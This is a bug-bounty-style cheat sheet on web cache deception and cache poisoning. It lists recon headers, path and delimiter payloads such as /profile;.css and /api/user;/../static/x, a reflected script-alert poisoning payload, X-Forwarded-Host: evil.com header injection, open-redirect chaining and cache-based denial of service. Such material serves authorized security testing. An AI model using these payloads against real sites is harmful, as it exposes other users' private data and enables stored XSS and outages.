# 🧠 WEB CACHE ATTACK CHEAT SHEET (BBP LEVEL)

---

# 🔍 1. RECON — Identify Cache

### Look for headers:

cf-cache-status: HIT/MISS  
x-cache: HIT/MISS  
age: 123  
via: varnish

### Identify CDN:

- **Cloudflare** → `cf-cache-status`
- **Akamai** → `x-cache`
- **Fastly**
- **Amazon CloudFront**

---

# 🎯 2. CACHEABLE ENDPOINTS

### Test:

GET /endpoint

Then repeat → check:

- HIT? → cached
- MISS always? → not cached

---

# 🔥 3. CACHE KEY TESTING

## Check if params affect cache:

/?test=1  
/?test=2

✔️ Same response + HIT → param ignored  
✔️ Different MISS → param part of key

---

## Check normalization:

/style.css  
/style.css/  
/style.css%2F  
/style.css/.

👉 If ALL HIT → **key normalization present**

---

# ⚔️ 4. CACHE DECEPTION (DATA LEAK)

## 🎯 Target:

Authenticated endpoints

/api/user  
/profile  
/orders

---

## Payloads:

### Static extension:

/profile.css  
/profile.js

---

### Delimiters:

/profile;.css  
/profile$.css  
/profile%0A.css

---

### Path confusion:

/profile/anything.css

---

### Normalization bypass:

/profile;/%2e%2e/static/x

---

## ✅ Success:

- Response contains user data
- Later accessible without auth

---

# 💣 5. CACHE POISONING

## Step 1 — Find reflection

Test:

?q=test  
User-Agent: test  
X-Forwarded-Host: test

---

## Step 2 — Poison

/?q=<script>alert(1)</script>

Then:

- Check if cached
- Reload without payload

---

## 🧨 Header-based poisoning:

X-Forwarded-Host: evil.com  
X-Host: evil.com

---

# 🧠 6. DELIMITER CONFUSION

Different backends treat delimiters differently

### Try ALL:

;  
$  
.  
%0A  
#

---

## Example:

/endpoint;.css

👉 Backend → `/endpoint`  
👉 CDN → `.css` → cache

---

# 🔄 7. PATH NORMALIZATION ATTACKS

## Payloads:

/%2e%2e/  
/./  
//

---

## Example:

/secret;/../static/x

👉 Backend → `/secret`  
👉 CDN → `/static/x`

---

# ⚡ 8. STATIC RULE ABUSE

CDN auto-caches:

/static/  
/assets/  
/main.js  
/style.css

---

## Exploit:

/api/user;/../static/x

---

# 🧪 9. KEY CONFUSION ATTACK

## Goal:

Store response under different key

---

## Payload:

/payload;/%2e%2e/home

👉 Cache stores under `/home`

---

# 🔥 10. OPEN REDIRECT + CACHE

## Step 1:

Find redirect:

/redirect?url=evil.com

---

## Step 2:

/redirect;/../main.js

👉 CDN caches redirect as JS  
👉 Users → redirected → possible XSS

---

# 💥 11. DOS VIA CACHE

## Idea:

Poison everything with static file

/home → returns CSS

---

## Payload:

/style.css;/../

---

# ⚙️ 12. HTTP VERSION CONFUSION (ADVANCED)

If:

- file upload exists
- response controllable

Try:

GET http://target.com/file

(no HTTP version)

---

👉 Can inject full response → cache poisoning

---

# 🧰 13. TESTING FLOW (USE THIS ALWAYS)

## Step-by-step:

### 1. Identify cache

### 2. Find cacheable endpoint

### 3. Test key behavior

### 4. Try delimiters

### 5. Try normalization

### 6. Try poisoning

### 7. Check cross-user impact

---

# 🚨 14. WHAT COUNTS AS VALID

✔️ Cached sensitive data  
✔️ Stored XSS / redirect  
✔️ Cross-user impact  
✔️ Resource abuse (heavy backend load)

---

# ❌ 15. WHAT IS USELESS

❌ Only cache MISS/HIT difference  
❌ Only delay  
❌ Only param variation  
❌ No cross-user impact